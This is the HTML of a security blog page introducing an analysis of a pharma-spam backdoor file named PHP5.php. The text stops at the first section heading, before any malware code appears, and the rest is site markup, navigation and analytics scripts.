<!DOCTYPE html>
<html lang="en-US">
<head >
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Pharma Hack Backdoor Analyzed - PHP5.PHP</title>
<meta name='robots' content='max-image-preview:large' />

<!-- Open Graph Meta Tags generated by MashShare 3.8.1 - https://mashshare.net -->
<meta property="og:type" content="article" /> 
<meta property="og:title" content="Pharma Hack Backdoor Analyzed – PHP5.PHP" />
<meta property="og:description" content="Some of you might remember my last Pharma hack post, Intelligent (Pharma) SPAM Decoded, today I will spend some time looking a different variant of the same infection type but focus on a payload that" />
<meta property="og:url" content="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html" />
<meta property="og:site_name" content="Sucuri Blog" />
<meta property="article:publisher" content="https://www.facebook.com/SucuriSecurity/" />
<meta property="article:published_time" content="2012-07-23T09:00:09-07:00" />
<meta property="article:modified_time" content="2016-06-10T09:19:52-07:00" />
<meta property="og:updated_time" content="2016-06-10T09:19:52-07:00" />
<!-- Open Graph Meta Tags generated by MashShare 3.8.1 - https://www.mashshare.net -->
<!-- Twitter Card generated by MashShare 3.8.1 - https://www.mashshare.net -->
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Pharma Hack Backdoor Analyzed – PHP5.PHP">
<meta name="twitter:description" content="Some of you might remember my last Pharma hack post, Intelligent (Pharma) SPAM Decoded, today I will spend some time looking a different variant of the same infection type but focus on a payload that">
<meta name="twitter:site" content="@sucurisecurity">
<!-- Twitter Card generated by MashShare 3.8.1 - https://www.mashshare.net -->


<!-- This site is optimized with the Yoast SEO Premium plugin v12.5 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html" />
<!-- / Yoast SEO Premium plugin. -->

<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Feed" href="https://blog.sucuri.net/feed" />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Comments Feed" href="https://blog.sucuri.net/comments/feed" />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Pharma Hack Backdoor Analyzed &#8211; PHP5.PHP Comments Feed" href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html/feed" />
<!-- This site uses the Google Analytics by MonsterInsights plugin v7.10.0 - Using Analytics tracking - https://www.monsterinsights.com/ -->
<script type="text/javascript" data-cfasync="false">
	var mi_version         = '7.10.0';
	var mi_track_user      = true;
	var mi_no_track_reason = '';
	
	var disableStr = 'ga-disable-UA-4077922-18';

	/* Function to detect opted out users */
	function __gaTrackerIsOptedOut() {
		return document.cookie.indexOf(disableStr + '=true') > -1;
	}

	/* Disable tracking if the opt-out cookie exists. */
	if ( __gaTrackerIsOptedOut() ) {
		window[disableStr] = true;
	}

	/* Opt-out function */
	function __gaTrackerOptout() {
	  document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
	  window[disableStr] = true;
	}
	
	if ( mi_track_user ) {
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');

		__gaTracker('create', 'UA-4077922-18', 'auto');
		__gaTracker('set', 'forceSSL', true);
		__gaTracker('require', 'displayfeatures');
		__gaTracker('send','pageview');
	} else {
		console.log( "" );
		(function() {
			/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
			var noopfn = function() {
				return null;
			};
			var noopnullfn = function() {
				return null;
			};
			var Tracker = function() {
				return null;
			};
			var p = Tracker.prototype;
			p.get = noopfn;
			p.set = noopfn;
			p.send = noopfn;
			var __gaTracker = function() {
				var len = arguments.length;
				if ( len === 0 ) {
					return;
				}
				var f = arguments[len-1];
				if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
					console.log( 'Not running function __gaTracker(' + arguments[0] + " ....) because you are not being tracked. " + mi_no_track_reason );
					return;
				}
				try {
					f.hitCallback();
				} catch (ex) {

				}
			};
			__gaTracker.create = function() {
				return new Tracker();
			};
			__gaTracker.getByName = noopnullfn;
			__gaTracker.getAll = function() {
				return [];
			};
			__gaTracker.remove = noopfn;
			window['__gaTracker'] = __gaTracker;
					})();
		}
</script>
<!-- / Google Analytics by MonsterInsights -->
<link rel='stylesheet' id='sucuri-blog-css'  href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/style.css?ver=1.2.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://blog.sucuri.net/wp-includes/css/dist/block-library/style.min.css?ver=6.0.1' type='text/css' media='all' />
<style id='global-styles-inline-css' type='text/css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel='stylesheet' id='select2-css'  href='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='mashsb-styles-css'  href='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/css/mashsb.min.css?ver=3.8.1' type='text/css' media='all' />
<style id='mashsb-styles-inline-css' type='text/css'>
.mashsb-count {color:#cccccc;}[class^="mashicon-"] .text, [class*=" mashicon-"] .text{
    text-indent: -9999px !important;
    line-height: 0px;
    display: block;
    } 
    [class^="mashicon-"] .text:after, [class*=" mashicon-"] .text:after {
        content: "" !important;
        text-indent: 0;
        font-size:13px;
        display: block !important;
    }
    [class^="mashicon-"], [class*=" mashicon-"] {
        width:25%;
        text-align: center !important;
    }
    [class^="mashicon-"] .icon:before, [class*=" mashicon-"] .icon:before {
        float:none;
        margin-right: 0;
    }
    .mashsb-buttons a{
       margin-right: 3px;
       margin-bottom:3px;
       min-width: 0;
       width: 41px;
    }
    .onoffswitch, 
    .onoffswitch-inner:before, 
    .onoffswitch-inner:after 
    .onoffswitch2,
    .onoffswitch2-inner:before, 
    .onoffswitch2-inner:after  {
        margin-right: 0px;
        width: 41px;
        line-height: 41px;
    }#mashbar-header .mashsb-count { 
    display:none; 
}
</style>
<link rel='stylesheet' id='sucuriblog-google-fonts-css'  href='//fonts.googleapis.com/css?family=Open+Sans:300,400,400italic,700,600' type='text/css' media='all' />
<link rel='stylesheet' id='cookie-banner-css-css'  href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/css/cookie-banner.css?ver=20200427' type='text/css' media='all' />
<script type='text/javascript' id='monsterinsights-frontend-script-js-extra'>
/* <![CDATA[ */
var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/blog.sucuri.net","hash_tracking":"false"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/google-analytics-premium/assets/js/frontend.min.js?ver=7.10.0' id='monsterinsights-frontend-script-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.js?ver=4.0.1' id='select2-js'></script>
<script type='text/javascript' id='mashsb-js-extra'>
/* <![CDATA[ */
var mashsb = {"shares":"25","round_shares":"1","animate_shares":"1","dynamic_buttons":"0","share_url":"https:\/\/blog.sucuri.net\/2012\/07\/pharma-hack-backdoor-analyzed-php5-php.html","title":"Pharma+Hack+Backdoor+Analyzed+%E2%80%93+PHP5.PHP","image":null,"desc":"Some of you might remember my last Pharma hack post, Intelligent (Pharma) SPAM Decoded, today I will spend some time looking a different variant of the same infection type but focus on a payload that \u2026","hashtag":"@sucurisecurity","subscribe":"link","subscribe_url":"http:\/\/sucuri.hs-sites.com\/subscribe-to-security","activestatus":"1","singular":"1","twitter_popup":"1","refresh":"1","nonce":"c1b7e23fe8","postid":"4919","servertime":"1659523379","ajaxurl":"https:\/\/blog.sucuri.net\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/js/mashsb.min.js?ver=3.8.1' id='mashsb-js'></script>
<!--[if lt IE 9]>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/html5shiv.min.js?ver=3.7.3' id='html5shiv-js'></script>
<![endif]-->
<link rel="https://api.w.org/" href="https://blog.sucuri.net/wp-json/" /><link rel="alternate" type="application/json" href="https://blog.sucuri.net/wp-json/wp/v2/posts/4919" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.sucuri.net/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.sucuri.net/wp-includes/wlwmanifest.xml" /> 
<link rel='shortlink' href='https://blog.sucuri.net/?p=4919' />


<!-- This site is optimized with the Schema plugin v1.7.9.4 - https://schema.press -->
<script type="application/ld+json">{"@context":"https:\/\/schema.org\/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sucuri.net\/2012\/07\/pharma-hack-backdoor-analyzed-php5-php.html"},"url":"https:\/\/blog.sucuri.net\/2012\/07\/pharma-hack-backdoor-analyzed-php5-php.html","headline":"Pharma Hack Backdoor Analyzed - PHP5.PHP","datePublished":"2012-07-23T09:00:09-07:00","dateModified":"2016-06-10T09:19:52-07:00","publisher":{"@type":"Organization","@id":"https:\/\/blog.sucuri.net\/#organization","name":"Sucuri Blog","logo":{"@type":"ImageObject","url":"","width":600,"height":60}},"articleSection":"Security Education","keywords":"Hacked Websites, SEO Spam, Website Backdoor","description":"Some of you might remember my last Pharma hack post, Intelligent (Pharma) SPAM Decoded, today I will spend some time looking a different variant of the same infection type but focus on a payload that is not encoded or embedded within an existing file, instead it resides in its","author":{"@type":"Person","name":"Rodrigo Escobar","url":"https:\/\/blog.sucuri.net\/author\/rodrigo","description":"Rodrigo Escobar is Sucuri's Sr. Malware Research Manager who joined the company in 2012. Rodrigo's main responsibilities include the coordination of malware analysts and research groups, and deployment of effective remediation solutions. His professional experience covers more than eight years in website remediation and malware analysis. When Rodrigo isn't investigating cyber threats and looking for solutions to prevent them, you might find him at the computer, reading assembly and learning new skills. Connect with him on LinkedIn.","image":{"@type":"ImageObject","url":"https:\/\/secure.gravatar.com\/avatar\/8cf56aa2ff693db59b0e186bf1b34f5a?s=96&d=mm&r=g","height":96,"width":96}}}</script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-4077922-18', 'auto');
  ga('require', 'linker');
  ga('linker:autoLink', ['ddecode.com', 'unmaskparasites.com', 'urlfind.org']);
  ga('send', 'pageview');
</script>

<script type="text/javascript">
(function(a,b,c,d,e,f,g){e['ire_o']=c;e[c]=e[c]||function(){(e[c].a=e[c].a||[]).push(arguments)};f=d.createElement(b);g=d.getElementsByTagName(b)[0];f.async=1;f.src=a;g.parentNode.insertBefore(f,g);})('//d.impactradius-event.com/A166802-5dda-4f98-aad8-1f58dbc8f1771.js','script','ire',document,window);
</script>
<script type='text/javascript'>/*<![CDATA[*/(function(n,d,c){d.setTime(d.getTime()+2592000000);c=(new RegExp('[?&]'+n+'=([^&#]*)','i')).exec(window.location.search);if(c=c?c[1]:null)document.cookie=n+'='+c+';expires='+d.toUTCString()+';domain=.sucuri.net;path=/';})('cjevent',new Date());/*]]>*/</script><!-- Tealium Universal Tag --><script type="text/javascript">(function(a,b,c,d){a='//tags.tiqcdn.com/utag/gpl/sucuri/prod/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a)})();</script><link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-32x32.png" sizes="32x32" />
<link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-180x180.png" />
<meta name="msapplication-TileImage" content="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-270x270.png" />
		<style type="text/css" id="wp-custom-css">
			#menu-item-17506{ background-color: #619f42;}
#menu-item-17506:hover {background-color:#478237}
#menu-item-17506 > a { color:#fff;}
.nav-primary {
 width: 80%;
}

.genesis-nav-menu {
 display:table;
}

.genesis-nav-menu .menu-item {
 float:none;
 display:table-cell;
 text-align:center;
 vertical-align:top;
}

.text-right {
 text-align:right !important;
}

.genesis-nav-menu .languages-sub-menu a {
 margin-right:0;
}

/* Blog Background Green Color Replace*/
#menu-item-17506 { background-color: #008673!important; }
.home.archive-post-grid .archive-featured-post:first-of-type { border-top: 8px solid #008673!important; }
.button { background-color: #008673!important; }
#sidebar-cta .widget { background-color: #008673!important; }
.fwp-load-more:focus, .fwp-load-more:hover, .load-more:focus, .load-more:hover {
    background-color: #008673!important;
}
.social-icons a::before {
    background-color: #008673!important;
}
.footer-widgets .social-icons a:focus::before, .footer-widgets .social-icons a:hover::before, .footer-widgets .button:focus, .footer-widgets .button:hover {
    background-color: #008673!important;
}	
.button { background-color: #008673!important; }

.footer-widgets .button:hover { background-color: #26BA9E!important; }		</style>
		</head>
<body class="post-template-default single single-post postid-4919 single-format-standard header-full-width content-sidebar"><div class="site-container"><ul class="genesis-skip-link"><li><a href="#genesis-nav-primary" class="screen-reader-shortcut"> Skip to primary navigation</a></li><li><a href="#genesis-content" class="screen-reader-shortcut"> Skip to content</a></li><li><a href="#genesis-sidebar-primary" class="screen-reader-shortcut"> Skip to primary sidebar</a></li><li><a href="#genesis-footer-widgets" class="screen-reader-shortcut"> Skip to footer</a></li></ul><header class="site-header" itemscope itemtype="https://schema.org/WPHeader"><div class="wrap"><div class="title-area"><p class="site-title" itemprop="headline"><a href="https://blog.sucuri.net/">Sucuri Blog</a></p><p class="site-description screen-reader-text" itemprop="description">Website Security News</p></div><nav class="nav-primary" aria-label="Main" itemscope itemtype="https://schema.org/SiteNavigationElement" id="genesis-nav-primary"><ul id="menu-header-navigation-ii" class="menu genesis-nav-menu menu-primary js-superfish"><li id="menu-item-17495" class="menu-item-products menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17495"><a href="https://sucuri.net/website-antivirus/signup" itemprop="url"><span itemprop="name">Products</span></a>
<ul class="sub-menu">
	<li id="menu-item-17496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17496"><a href="https://sucuri.net/website-security-platform/signup/" itemprop="url"><span itemprop="name">Website Security Platform</span></a></li>
	<li id="menu-item-17497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17497"><a href="https://sucuri.net/website-firewall/" itemprop="url"><span itemprop="name">Website Firewall (WAF)</span></a></li>
	<li id="menu-item-20814" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20814"><a href="https://sucuri.net/custom/enterprise/" itemprop="url"><span itemprop="name">Enterprise Website Security</span></a></li>
	<li id="menu-item-20815" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20815"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Multisite Solutions</span></a></li>
</ul>
</li>
<li id="menu-item-17498" class="menu-item-industry menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17498"><a href="https://sucuri.net/website-security-platform/" itemprop="url"><span itemprop="name">Features</span></a>
<ul class="sub-menu">
	<li id="menu-item-17499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17499"><a href="https://sucuri.net/malware-detection-scanning/" itemprop="url"><span itemprop="name">Detection</span></a></li>
	<li id="menu-item-17500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17500"><a href="https://sucuri.net/website-hack-protection/" itemprop="url"><span itemprop="name">Protection</span></a></li>
	<li id="menu-item-17501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17501"><a href="https://sucuri.net/website-performance/" itemprop="url"><span itemprop="name">Performance</span></a></li>
	<li id="menu-item-19564" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19564"><a href="https://sucuri.net/website-malware-removal/" itemprop="url"><span itemprop="name">Response</span></a></li>
	<li id="menu-item-19911" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19911"><a href="https://sucuri.net/website-backups/" itemprop="url"><span itemprop="name">Backups</span></a></li>
</ul>
</li>
<li id="menu-item-19912" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-19912"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a>
<ul class="sub-menu">
	<li id="menu-item-19913" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19913"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Agency Solutions</span></a></li>
	<li id="menu-item-19915" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19915"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a></li>
	<li id="menu-item-20816" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20816"><a href="https://sucuri.net/referral/" itemprop="url"><span itemprop="name">Referral Program</span></a></li>
	<li id="menu-item-19914" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19914"><a href="https://sucuri.net/ecommerce-website-security/" itemprop="url"><span itemprop="name">Ecommerce</span></a></li>
</ul>
</li>
<li id="menu-item-20817" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-20817"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Resources</span></a>
<ul class="sub-menu">
	<li id="menu-item-20818" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20818"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Guides</span></a></li>
	<li id="menu-item-20819" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20819"><a href="https://sucuri.net/webinars/" itemprop="url"><span itemprop="name">Webinars</span></a></li>
	<li id="menu-item-20820" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20820"><a href="https://sucuri.net/infographics/" itemprop="url"><span itemprop="name">Infographics</span></a></li>
	<li id="menu-item-20821" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20821"><a href="https://sitecheck.sucuri.net/" itemprop="url"><span itemprop="name">SiteCheck</span></a></li>
	<li id="menu-item-20822" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20822"><a href="https://sucuri.net/reports/" itemprop="url"><span itemprop="name">Reports</span></a></li>
	<li id="menu-item-22570" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-22570"><a href="https://sucuri.net/email-courses/" itemprop="url"><span itemprop="name">Email Courses</span></a></li>
</ul>
</li>
<li id="menu-item-17506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17506"><a href="https://sucuri.net/website-security-platform/help-now" itemprop="url"><span itemprop="name">Immediate Help</span></a></li>
<li id="menu-item-17509" class="menu-item-login menu-item menu-item-type-custom menu-item-object-custom menu-item-17509"><a href="https://dashboard.sucuri.net/login/" itemprop="url"><span itemprop="name">Login</span></a></li>
</ul></nav><button id="responsive-menu" role="button" aria-controls="genesis-nav-primary" aria-pressed="false"><span class="screen-reader-text">Menu</span></button></div></header><div class="site-inner"><div class="wrap"><div class="content-sidebar-wrap"><main class="content" id="genesis-content"><article class="post-4919 post type-post status-publish format-standard category-security-education category-website-malware-infections tag-hacked-websites tag-seo-spam tag-website-backdoor entry"><header class="entry-header"><h1 class="entry-title">Pharma Hack Backdoor Analyzed &#8211; PHP5.PHP</h1>
<p class="entry-meta"><time class="entry-time" datetime="2012-07-23T09:00:09-07:00">July 23, 2012</time><span class="entry-author"><a href="https://blog.sucuri.net/author/rodrigo" class="entry-author-link" rel="author"><span class="entry-author-name">Rodrigo Escobar</span></a></span></p></header><div class="entry-content"><aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2012%2F07%2Fpharma-hack-backdoor-analyzed-php5-php.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Pharma%20Hack%20Backdoor%20Analyzed%20%E2%80%93%20PHP5.PHP&url=https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--><p>Some of you might remember my last Pharma hack post, <a href="https://blog.sucuri.net/2012/03/intelligent-pharma-spam-decoded.html">Intelligent (Pharma) SPAM Decoded</a>, today I will spend some time looking a different variant of the same infection type but focus on a payload that is not encoded or embedded within an existing file, instead it resides in its own file &#8211; PHP5.php.</p>
<blockquote><p>&#8220;Hmm, maybe it&#8217;s a good / system file, it does have PHP in it, I won&#8217;t bother looking at it&#8230;&#8221;</p></blockquote>
<p>If you have ever come across this file and find yourself thinking this, we highly encourage you not to and take a minute to see if any of its components resemble what we&#8217;re about to share. </p>
<h3>Dissecting the Payload</h3>
<p><span id="more-4919"></span></p>
<h4><strong>1. Online Store</strong></h4>
